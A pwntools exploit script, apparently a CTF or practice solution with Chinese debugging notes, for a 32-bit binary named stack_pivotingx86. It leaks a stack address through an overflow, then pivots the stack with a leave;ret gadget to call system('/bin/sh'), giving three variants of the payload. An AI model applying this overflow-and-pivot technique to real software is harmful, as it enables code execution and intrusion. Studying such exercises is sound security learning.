"""
  char buf[40]; // [esp+0h] [ebp-28h] BYREF
  read(0, buf, 0x30u);  // 能溢出8个字节
  ...
  return read(0, buf, 0x30u);

第一次输入 Hello
断点到第二次 read 后面ret后返回main的地址 输入 bbbb
ECX  0xffffd4e0 ◂— 0x62626262 ('bbbb')
EBP  0xffffd518 ◂— 0x0 # 0x518 - 0x4e0 = 0x38, 即 buf = ebp - 0x38, 这里要填充4个字节, 调试一下就能发现正确的填充值 ebp-0x38执行的是buf+4的地址。
"""
from pwn import *

s = process('./stack_pivotingx86')
elf = ELF('./stack_pivotingx86')
context(log_level='debug', arch='i386', os='linux')

system = elf.symbols['system']
leave_ret = ROP(elf).find_gadget(['leave', 'ret'])[0]
bin_sh = elf.search(b'/bin/sh').__next__()

payload1 = 'a' * (40 - 1) + 'b'  # 留一个为了接收指定b, 40字节全部填充无0就会输出后面
s.send(payload1)
s.recvuntil(b'aaab')
ebp = u32(s.recv(4))
success('ebp >>> ' + hex(ebp))


def func1():
    payload2 = flat('bbbb', system, 0xdeadbeef, bin_sh)
    payload2 = flat(payload2.ljust(0x28, b'a'), ebp - 0x38, leave_ret)
    print(payload2)
    s.send(payload2)


def func2():
    rop = ROP('./stack_pivotingx86')
    rop.raw('aaaa')
    rop.call(system, [bin_sh])
    payload2 = rop.chain().ljust(0x28, b'a')
    payload2 = flat(payload2, ebp - 0x38, leave_ret)
    print(payload2)
    s.send(payload2)


def func3():
    rop = ROP('./stack_pivotingx86')
    rop.raw('aaaa')
    rop.call(system, [bin_sh])
    payload2 = rop.chain().ljust(0x28, b'a')
    rop = ROP('./stack_pivotingx86')
    rop.raw(payload2)
    rop.raw(ebp - 0x38)
    rop.raw(leave_ret)
    payload3 = rop.chain()
    print(payload3)
    s.send(payload3)


func1()
# func2()
# func3()
s.interactive()
